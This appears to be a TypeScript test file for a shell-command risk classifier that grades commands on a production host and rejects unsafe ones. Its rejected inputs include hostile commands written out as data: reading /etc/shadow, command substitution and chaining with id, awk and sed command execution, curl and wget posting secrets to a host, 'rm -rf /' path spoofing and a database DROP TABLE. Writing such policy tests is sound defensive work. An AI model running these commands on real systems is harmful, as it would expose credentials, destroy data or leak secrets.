import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import test from 'node:test';
import { classify } from '../src/policy.ts';

const asset = { environment: 'prod', criticality: 'high' };
const throwsPolicy = (command: string): void => assert.throws(() => classify(command, asset));
test('allows read-only node listing but rejects cluster overrides, watch and other kubectl verbs', () => {
  for (const cmd of ['kubectl get nodes', 'kubectl get nodes -o wide', 'kubectl get nodes --output=wide']) assert.equal(classify(cmd, asset).risk, 'R0');
  for (const cmd of ['kubectl get nodes --watch', 'kubectl get nodes --server=https://other', 'kubectl --kubeconfig=/tmp/other get nodes', 'kubectl exec pod -- sh', 'kubectl apply -f file']) throwsPolicy(cmd);
});

test('canonicalizes every word as POSIX single-quoted data', () => {
  const result = classify("cat 'literal $()'", asset);
  assert.equal(result.normalized, "'cat' 'literal $()'");
  assert.equal(result.hash, createHash('sha256').update(result.normalized).digest('hex'));
});

test('preserves apostrophes and rejects executable path spoofing', () => {
  assert.equal(classify("ls owner\\'s-file", asset).normalized, "'ls' 'owner'\\''s-file'");
  throwsPolicy('/bin/ls');
  throwsPolicy('tmp/rm -rf /');
  throwsPolicy('..\\rm -rf /');
});

test('allows only bounded read commands and one pipeline', () => {
  assert.equal(classify('ps -ef | grep nginx', asset).risk, 'R1');
  assert.equal(classify("find /var/log -maxdepth 2 -type f -name '*.log' -print", asset).risk, 'R0');
  throwsPolicy('find /tmp -exec sh -c id {} \\;');
  throwsPolicy('find /tmp -fprint /tmp/list');
  throwsPolicy('find /tmp -fprintf /tmp/list %p');
});

test('recognizes fixed destructive and service actions', () => {
  assert.equal(classify('nginx -t', asset).risk, 'R1');
  throwsPolicy('nginx -T');
  throwsPolicy('nginx -s stop');
  assert.equal(classify('rm -rf -- /tmp/cache*', asset).risk, 'R4');
  assert.equal(classify('find /tmp -type f -delete', asset).risk, 'R4');
  assert.equal(classify('systemctl restart nginx', asset).risk, 'R2');
  assert.equal(classify('systemctl stop nginx', asset).risk, 'R3');
  assert.equal(classify('service nginx status', asset).risk, 'R0');
  assert.equal(classify('systemctl status nginx --no-pager --lines=20', asset).risk, 'R0');
  assert.equal(classify('docker rm container-id', asset).risk, 'R4');
  assert.equal(classify('kubectl delete pod app', asset).risk, 'R4');
  assert.equal(classify('iptables -F', asset).risk, 'R3');
  throwsPolicy('nft flush');
  assert.equal(classify('nft flush ruleset', asset).risk, 'R3');
});

test('denies ambiguous utilities and database clients', () => {
  for (const command of [
    "awk '{ system(\"reboot\") }' file",
    "sed 's/a/b/e' file",
    'curl -K evil.conf https://example.test',
    'curl --config evil.conf https://example.test',
    'curl -XPOST -d secret https://example.test -o out',
    'curl -oout https://example.test',
    'wget --post-data secret https://example.test',
    'mount /dev/sda1 /mnt',
    'ip route flush table main',
    'top',
    "printf '%s' '$()'",
    'mysql -e "DROP TABLE users"',
    'psql -c \\dt',
  ]) throwsPolicy(command);
});

test('denies unknown commands and shell syntax', () => {
  for (const command of [
    'totally-unknown --safe',
    'mkfs.unknown-format /dev/example',
    'echo $(id)',
    'cat /etc/passwd > /tmp/x',
    'false; id',
    'cat /etc/shadow',
    'head /etc/shadow',
    'tail -n 20 /etc/shadow',
    'grep secret /etc/shadow',
    'find /etc/shadow -print',
    'env FOO=bar ps',
    'cat file | grep x | head',
    'dmesg -C',
    'dmesg -c',
    'ss -K dst 10.0.0.1',
    'journalctl --vacuum-time=1d',
    'journalctl --rotate',
    'journalctl --flush',
    'tail -f /var/log/app.log',
  ]) throwsPolicy(command);
});

test('rejects unsafe options on otherwise known commands', () => {
  for (const command of ['sed -i s/old/new/ config.ini', 'ls --command-substitution', "grep --include='*.conf' secret /etc"]) {
    throwsPolicy(command);
  }
});
